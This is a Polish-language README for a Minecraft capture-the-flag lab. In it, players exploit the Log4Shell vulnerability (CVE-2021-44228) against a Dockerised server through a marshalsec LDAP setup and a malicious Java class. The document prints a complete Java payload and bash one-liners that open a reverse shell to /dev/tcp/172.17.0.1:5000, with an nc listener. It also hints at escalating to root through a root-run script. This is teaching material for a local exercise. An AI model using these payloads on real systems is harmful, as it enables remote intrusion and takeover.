# minecraft-ctf

## Wprowadzenie
Witamy w `minecraft-ctf`, wyjątkowym wyzwaniu CTF stworzonym specjalnie dla Was! Twoim zadaniem będzie zdobycie flagi, wykorzystując podatność Log4j oraz kilka innych narzędzi, a to wszystko co najlepsze, z użyciem gry, którą chyba każdy zna! Przygotuj się na fascynujące wyzwanie! Owocnego hackowania i udanej zabawy!

## Wymagania
- Docker
- Java (do uruchomienia clienta Minecrafta - jeśli jej nie masz, pobierz i zainstaluj)
- Minecraft Launcher
- NetCat (użyj WSL lub zainstaluj na Windowsie)

## HARD - Ogólny zarys postępowania
1. Uruchom server docker z serverem Minecraft:
   - `docker run -p 25565:25565 -it kwasnyy/mcctf:mcexpl`
2. Wykorzystaj podatność CVE-2021-44228 do uzyskania reverse shell
   - napoczęty `marshalsec/Dockerfile` może ci ułatwić,
   - tak samo masz `codehttp/` gdzie manipulować trzeba tylko linijką pod "// TODO" w pliku `Log4jRCE.java`
3. Interesujący cię plik jest umieszczony gdzieś na systemie,
4. Rozejrzyj się po plikach w folderze `/server`
5. Po odczytaniu flagi zapraszamy do wspólnej gry :)


## EASY - Krok po kroku

### 0. Uruchamianie SKLauncher
   1. Otwórz SKLauncher, który również znajduje się w repozytorium.
   2. Wybierz tryb offline.
   3. Kliknij '+' obok "Installations Manager".
   4. Wybierz release 1.8.8, zapisz i naciśnij PLAY.

### 1. Uruchomienie serwera Minecraft
   1. **Uruchom Minecraft'a:**
      - `docker run -p 25565:25565 -it kwasnyy/mcctf:mcexpl`
      - po zbudowaniu kontenera i uruchomieniu, w trybie Multiplayer w grze, dodaj serwer pod adresem 127.0.0.1.

### 2. Wykorzystaj podatnośc CVE-2021-44228 do uzyskania reverse shell


<details>
<summary><b>Informacje o kontenerach</b></summary>
Dwa spośród trzech odpalonych przez Ciebie kontenerów są "Twoje" - jako hacker je kontrolujesz. Nienależącym do Ciebie jest ten hostujący serwer Minecraft'a, do którego chcesz uzyskać dostęp. Pozostałe kontenery pomogą Ci w tej misji.
</details>

   1. **Uruchom serwer LDAP:**
      - `cd marshalsec`
      - znając schemat działania *JNDI* ustaw w Dockerfile adres IP i PORT gdzie będzie wystawiony kod do wykonania na serwerze Minecrafta,
      - `docker build . -t marshal`
      - `docker run -p 1389:1389 -ti marshal`

   2. **Przygotuj kod do połączenia się z reverse shell i wystaw go na serwerze http:**
      - cd `codehttp/`
      - ten kontener służy do serwowania statycznych plików po http,
      - edytuj linijkę w pliku `Log4jRCE.java`,
         1. musisz stworzyć plik, a poten ten plik uruchomić ¯\_(ツ)_/¯, uruchomienie komendy bezpośrednio nie działa,
         2. możesz to zrobić jedną komendą :D
         3. 
            <details>
            <summary><b> Pokaż komendę:</b></summary>

            ```java
            String[] cmd = {"bash", "-c", "echo 'nohup bash -i >/dev/tcp/172.17.0.1/5000 2>&1 0<&1 &' > /server/script.sh; bash /server/script.sh"};
            ```

            </details>
      - podczas budowania obrazu zostanie ten plik do niego skopiowany, a następnie skompilowany,
      - a po uruchomieniu kontenera, będzie serwowany plik "Log4jRCE.class" na porcie *:8888* tego kontenera,
      - zbuduj obraz: `docker build . -t codehttp`,
      - uruchom kontener: `docker run -p 8888:8888 -ti codehttp`,



## Twoje zadanie
Wykorzystaj podatność starej wersji Log4j i inne narzędzia do zdobycia ukrytej flagi. Kod hostowany na httpcode musi być przygotowany i skompilowany. Znajdź i zmodyfikuj bashowy skrypt wykonywany z uprawnieniami roota. Jak uzyskasz uprawnienia roota, możesz odnaleźć w plikach kod, który następnie wpiszesz w serwerze Minecrafta. Jeśli kod okaże się poprawny - gratulacje hackerze/ko ;)

## Przydatne informacje

uzyskania Reverse Shell
```sh
# Nasłuchuj na porcie `5000` na swoim komputerze:
nc -l 5000

# Na komputerze ofiary:
bash -i >& /dev/tcp/[ip kompa na którym jest `nc` włączony]/5000 0>&1

# przykład:
bash -i >& /dev/tcp/172.17.0.1/5000 0>&1
```

### Budowanie obrazu:
```sh
# Stworzenie obrazu kontenera:
docker build . -t <nazwa-obrazu>

# Uruchomienie obrazu z przekierowaniem portów:
docker run -p 25565:25565 -ti <nazwa-obrazu>
```

### Konfiguracja EOL w VSCode
```sh
# Jeśli pracujesz na Windowsie, konieczna może okazać się zmiana EOL - End Of Line:
- Otwórz `Minecraft-Log4j-Exploit/server/start_server.sh`.
- Użyj `CTRL + SHIFT + P`.
- Zmień `EOL sequence`.
```

## Przydatne komendy 

### Docker
```sh
docker build
docker run
docker ps
docker ps -a
docker kill <id>
docker remove <id>
docker image prune
docker container prune
```

## Credits
- [Minecraft-Log4j-Exploit](https://github.com/Justin-Garey/Minecraft-Log4j-Exploit) od Justina Gareya
- [marshalsec](https://github.com/mbechler/marshalsec) od Marcina Bechlera
- [Smallest Docker Image Static Website](https://lipanski.com/posts/smallest-docker-image-static-website) od Vladimira Lipanskiego
- [Mapa Minecraft]() od XXX


TODO:
lf w starcie

wejsc na server mc wpisac komende

jak zatrzymać bash -uzyskania reverse shell?

echo to wbudowana funkcja basha, a nie żadna binarka 

allready allocated port: docker desktop delete container, 

find / -name "*flag*" 2>/dev/null

